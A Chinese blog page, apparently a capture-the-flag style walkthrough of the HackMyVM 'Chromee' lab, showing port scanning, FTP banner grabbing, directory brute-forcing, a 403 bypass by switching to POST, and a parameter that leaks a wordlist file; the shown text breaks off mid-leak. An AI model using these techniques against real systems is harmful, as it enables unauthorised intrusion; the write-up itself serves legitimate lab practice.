@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="又是新靶机没做出来系列。。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Chromee WP复现及复盘">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/46850.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="又是新靶机没做出来系列。。。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e7ae070ba3d5a1d7e62008.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e7b7f10ba3d5a1d7e63e51.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e7b8810ba3d5a1d7e640b3.png">
+<meta property="article:published_time" content="2025-03-29T07:15:57.000Z">
+<meta property="article:modified_time" content="2025-03-29T09:13:51.859Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67e7ae070ba3d5a1d7e62008.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/46850.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-Chromee WP复现及复盘 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">69</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/46850.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-Chromee WP复现及复盘
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-29 15:15:57 / 修改时间：17:13:51" itemprop="dateCreated datePublished" datetime="2025-03-29T15:15:57+08:00">2025-03-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67e79e200ba3d5a1d7e5f029.png" class="img-topic">
+        </div>
+      
+      
+        <p>又是新靶机没做出来系列。。。</p>
+<span id="more"></span>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这里有第一个坑，就是要用全端口扫描，可以扫到一个ftp端口  这里用nc直接连上去可以知道是什么服务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nmap -p- 192.168.80.38 </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-29 15:27 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (192.168.80.38)</span><br><span class="line">Host is up (0.0088s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">8080/tcp  open  http-proxy</span><br><span class="line">23333/tcp open  elxmgmt</span><br><span class="line">MAC Address: C8:21:58:16:CF:C4 (Intel Corporate)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.96 seconds</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc 192.168.80.38 23333 </span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>ftp 不能直接匿名登录 提示需要密码 那就去web里找找信息</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web 有80端口和8080端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.80.38 -x php,txt,jpg,js</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.80.38</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,jpg,js</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/post.php             (Status: 200) [Size: 3]</span><br><span class="line">/secret.php           (Status: 200) [Size: 549]</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.80.38/secret.php                                  </span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    $greeting = date(&#x27;H&#x27;) &lt; 12 ? &#x27;早上好&#x27; : (date(&#x27;H&#x27;) &lt; 18 ? &#x27;下午好&#x27; : &#x27;晚上好&#x27;);</span><br><span class="line">    $visitorIP = htmlspecialchars($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;h1&gt;&#123;$greeting&#125;，adriana&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;当前时间：&quot; . date(&#x27;Y-m-d H:i:s&#x27;) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;你的IP：&#123;$visitorIP&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    if (isset($_GET[&#x27;aaa&#x27;])) &#123;</span><br><span class="line">    	$file_content = file_get_contents(&#x27;/opt/note/dic.txt&#x27;);</span><br><span class="line">    	echo $file_content;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">    		die();</span><br><span class="line">	&#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+<p>80端口有作用的是这个secret.php 但是直接访问发现直接给了php源码，没有解析 ,但是可以看到这个逻辑是如果有aaa参数就会给一个字典</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.80.38:8080 -x php,txt,jpg,js</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.80.38:8080</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              txt,jpg,js,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/javascript           (Status: 301) [Size: 326] [--&gt; http://192.168.80.38:8080/javascript/]</span><br><span class="line">/silence              (Status: 403) [Size: 280]</span><br></pre></td></tr></table></figure></div>
+<p>8080端口一个403状态码的silence目录， 如果直接访问8080端口，有一个提示，用bypass  bypass403 这个是一个工具可以尝试绕过一些403</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.80.38:8080                                        </span><br><span class="line">&lt;h2&gt;You may need to bypass!&lt;/h2&gt;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] HTTP Method Bypass</span><br><span class="line">----------------------</span><br><span class="line">GET :  Status: 403, Length : 280 </span><br><span class="line">POST :  Status: 200, Length : 616  ð</span><br><span class="line">╭───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮</span><br><span class="line"> ╰─&gt; PAYLOAD : curl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POST</span><br></pre></td></tr></table></figure></div>
+<p>发现用post请求是可以访问的<br>用给的payload访问</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POSTcurl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POST</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Silence&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">      text-align: center;</span><br><span class="line">      margin: 0;</span><br><span class="line">      padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: center;</span><br><span class="line">      align-items: center;</span><br><span class="line">      height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p &#123;</span><br><span class="line">      font-size: 18px;</span><br><span class="line">      color: #888;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Silence&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;We are working to improve our website.&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;contact: support@chromee.hmv&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Silence&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">      text-align: center;</span><br><span class="line">      margin: 0;</span><br><span class="line">      padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: center;</span><br><span class="line">      align-items: center;</span><br><span class="line">      height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p &#123;</span><br><span class="line">      font-size: 18px;</span><br><span class="line">      color: #888;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Silence&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;We are working to improve our website.&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;contact: support@chromee.hmv&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POSTcurl -ks &#x27;192.168.80.38:8080/silence&#x27; -L -H &#x27;User-Agent: Mozilla/5.0&#x27; -X POST</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Silence&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">      text-align: center;</span><br><span class="line">      margin: 0;</span><br><span class="line">      padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: center;</span><br><span class="line">      align-items: center;</span><br><span class="line">      height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p &#123;</span><br><span class="line">      font-size: 18px;</span><br><span class="line">      color: #888;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Silence&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;We are working to improve our website.&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;contact: support@chromee.hmv&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Silence&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">      text-align: center;</span><br><span class="line">      margin: 0;</span><br><span class="line">      padding: 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: center;</span><br><span class="line">      align-items: center;</span><br><span class="line">      height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      font-size: 30px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p &#123;</span><br><span class="line">      font-size: 18px;</span><br><span class="line">      color: #888;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Silence&lt;/h1&gt;</span><br><span class="line">      &lt;p&gt;We are working to improve our website.&lt;/p&gt;</span><br><span class="line">      &lt;p&gt;contact: support@chromee.hmv&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+<p>这里给了一个域名chromee.hmv 所以修改域名，之后再访问secret.php 就可以解析了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl chromee.hmv/secret.php?aaa=1</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;早上好，adriana&lt;/h1&gt;&lt;p&gt;当前时间：2025-03-29 08:42:54&lt;/p&gt;&lt;p&gt;你的IP：192.168.80.11&lt;/p&gt;The Lost Key</span><br><span class="line"></span><br><span class="line">Lily, a curious girl, found an old rusty key in the woods. 